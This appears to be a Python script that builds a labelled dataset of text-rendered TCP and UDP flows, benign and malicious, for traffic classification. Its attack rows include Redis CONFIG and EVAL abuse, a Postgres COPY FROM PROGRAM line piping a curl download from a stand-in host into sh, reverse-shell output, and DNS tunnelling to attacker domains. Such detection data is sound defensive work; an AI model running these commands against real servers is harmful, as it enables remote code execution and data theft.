"""TCP and UDP flows turned into text: flow metadata plus the first bytes.

The first 64 bytes are written as printable ASCII, with other bytes as \\xNN.
Label "attack" means the flow is malicious. Run: python -I flows.py > flows.jsonl
"""
import json
import random

R = random.Random(4)


def first_bytes(b, n=64):
    return "".join(chr(c) if 32 <= c < 127 else "\\x%02x" % c for c in b[:n])


def flow(proto, src, dst, port, b, server=None):
    meta = f"{proto} flow from {src} to {dst}:{port}"
    if server:
        meta += f", server {server}"
    return f"{meta}, first client bytes ({len(b)} B): {first_bytes(b)}"


def resp(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return out


def dns(qname, qtype=1):
    hdr = R.randbytes(2) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    q = b"".join(bytes([len(p)]) + p.encode() for p in qname.split(".")) + b"\x00"
    return hdr + q + qtype.to_bytes(2, "big") + b"\x00\x01"


ROWS = [
    ("redis-get", [], flow("TCP", "carts-7d9f", "redis.shop.svc", 6379, resp(b"GET", b"cart:9f1c"), "redis")),
    ("redis-hset", [], flow("TCP", "carts-7d9f", "redis.shop.svc", 6379, resp(b"HSET", b"cart:9f1c", b"sku", b"A-100"), "redis")),
    ("redis-config", ["attack"], flow("TCP", "front-5c2a", "redis.shop.svc", 6379, resp(b"CONFIG", b"SET", b"dir", b"/var/spool/cron"), "redis")),
    ("redis-slaveof", ["attack"], flow("TCP", "front-5c2a", "redis.shop.svc", 6379, resp(b"SLAVEOF", b"203.0.113.7", b"6379"), "redis")),
    ("redis-eval", ["attack"], flow("TCP", "front-5c2a", "redis.shop.svc", 6379, resp(b"EVAL", b"os.execute('id')", b"0"), "redis")),
    ("pg-startup", [], flow("TCP", "orders-1b2c", "pg.shop.svc", 5432, b"\x00\x00\x00\x2a\x00\x03\x00\x00user\x00orders\x00database\x00orders\x00\x00", "postgres")),
    ("pg-copy-prog", ["attack"], flow("TCP", "orders-1b2c", "pg.shop.svc", 5432, b"Q\x00\x00\x00\x40COPY t FROM PROGRAM 'curl 203.0.113.7/x|sh';\x00", "postgres")),
    ("tls-hello", [], flow("TCP", "front-5c2a", "api.payments.example", 443, b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03" + R.randbytes(40), "tls")),
    ("tls-hello-odd", ["attack"], flow("TCP", "users-6f7e", "198.51.100.23", 8443, b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03" + R.randbytes(40), "tls")),
    ("ssh-banner", [], flow("TCP", "bastion-0", "git.internal", 22, b"SSH-2.0-OpenSSH_9.6\r\n", "ssh")),
    ("revshell", ["attack"], flow("TCP", "users-6f7e", "203.0.113.7", 4444, b"bash: no job control in this shell\nroot@users-6f7e:/# id\n")),
    ("smtp", [], flow("TCP", "mailer-2", "smtp.example", 25, b"EHLO mailer-2.shop.svc\r\n", "smtp")),
    ("dns-a", [], flow("UDP", "front-5c2a", "kube-dns", 53, dns("users.shop.svc.cluster.local"), "dns")),
    ("dns-aaaa", [], flow("UDP", "front-5c2a", "kube-dns", 53, dns("api.payments.example", 28), "dns")),
    ("dns-tunnel", ["attack"], flow("UDP", "users-6f7e", "kube-dns", 53, dns("mfrggzdfmztwq2lknnwg23tpobyxe43uov3ho6dzpi.ex.attacker.example", 16), "dns")),
    ("dns-tunnel2", ["attack"], flow("UDP", "users-6f7e", "kube-dns", 53, dns("aGVsbG8gd29ybGQgc2VjcmV0.t1.c2.evil.test", 16), "dns")),
    ("ntp", [], flow("UDP", "node-agent", "time.cloud.example", 123, b"\x23" + b"\x00" * 47, "ntp")),
    ("memcached-amp", ["attack"], flow("UDP", "203.0.113.50", "memcached.shop.svc", 11211, b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", "memcached")),
    ("http-plain", [], flow("TCP", "front-5c2a", "users.shop.svc", 8080, b"GET /users/42 HTTP/1.1\r\nHost: users\r\n\r\n", "http")),
    ("smb-scan", ["attack"], flow("TCP", "users-6f7e", "10.0.3.17", 445, b"\x00\x00\x00\x85\xffSMBr\x00\x00\x00\x00\x18\x53\xc8", "smb")),
]

if __name__ == "__main__":
    for name, labels, text in ROWS:
        print(json.dumps({"id": name, "cat": "flow-" + ("attack" if labels else "benign"), "labels": labels + (["flow"] if labels else []), "text": text}))
